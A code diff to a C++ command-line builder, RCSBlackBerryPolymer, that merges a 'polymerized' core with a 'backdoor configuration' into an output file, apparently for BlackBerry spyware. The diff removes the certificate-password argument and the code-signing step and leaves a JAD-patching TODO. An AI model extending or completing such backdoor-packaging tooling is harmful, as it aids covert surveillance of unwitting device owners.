@@ -33,34 +33,27 @@ int _tmain(int argc, _TCHAR* argv[])
 	HANDLE hFile;
 	BYTE *pCorePtr	= NULL;
 	BYTE *pConfigPtr = NULL;
-	WCHAR wsCertPass[MAX_PATH];
+
 	WCHAR wsCoreFile[MAX_PATH];
 	WCHAR wsConfigFile[MAX_PATH];
 	WCHAR wsOutFile[MAX_PATH];
-	WCHAR wsCSKFile[MAX_PATH];
-	WCHAR wsDBFile[MAX_PATH];
-	WCHAR wsSETFile[MAX_PATH];
+
 	unsigned int iLen = 0;
 	unsigned int iConfigLen = 0;
 
-	if (argc != 5) {
+	if (argc != 4) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSBlackBerryPolymer.exe  <core> <config> <cert_pass> <output>\n\n");
+		printf("  usage:  RCSBlackBerryPolymer.exe  <core> <config> <output>\n\n");
 		printf("  <core> is the core already polymerized\n");
 		printf("  <config> is the backdoor configuration\n");
-		printf("  <cert_pass> is the private key of the certificate\n");
 		printf("  <output> is the output file\n\n");
 		return 0;
 	}
 
 	wsprintf(wsCoreFile, L"%s", argv[1]);
 	wsprintf(wsConfigFile, L"%s", argv[2]);
-	wsprintf(wsCertPass, L"%s", argv[3]);
-	wsprintf(wsOutFile, L"%s", argv[4]);	
+	wsprintf(wsOutFile, L"%s", argv[3]);	
 
-	wsprintf(wsCSKFile, L"sigtool.csk");	
-	wsprintf(wsDBFile, L"sigtool.db");	
-	wsprintf(wsSETFile, L"sigtool.set");	
 
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
@@ -80,34 +73,12 @@ int _tmain(int argc, _TCHAR* argv[])
 		CloseHandle(hFile);
 	}
 
-	if ( (hFile = CreateFile(wsCSKFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find cert file [%S]\n", wsCSKFile);
-		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
-	}
-
-	if ( (hFile = CreateFile(wsDBFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find cert file [%S]\n", wsDBFile);
-		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
-	}
-
-	if ( (hFile = CreateFile(wsSETFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find cert file [%S]\n", wsSETFile);
-		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
-	}
-
 	/************************************************************************/
 	/*  READY TO GO                                                         */
 	/************************************************************************/
 
 	printf("Ready to go...\n");
 	printf("CONFIG FILE   [%S]\n", wsConfigFile);
-	printf("CERT PASS     [%S]\n", wsCertPass);
 	printf("INPUT CORE    [%S]\n", wsCoreFile);
 	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);
 
@@ -148,19 +119,9 @@ int _tmain(int argc, _TCHAR* argv[])
 	UnloadFile(hPEFileConfig, hMappedFileConfig, pConfigPtr);
 
 	/************************************************************************/
-	/* SIGNING                                                              */
+	/* JAD PATCHING                                                         */
 	/************************************************************************/
-
-
-	if (SignCod(wsOutFile, wsCertPass))
-		printf("Using the certificate to sign the code... ok\n");
-	else {
-		printf("Cannot sign with the certificate file [%S][%S]\n", wsOutFile, wsCertPass);
-		DeleteFile(wsOutFile);
-		return ERROR_EMBEDDING;
-	}
-
-	printf("Output file... ok\n");
+    // TODO
 
 	return ERROR_SUCCESS;
 }
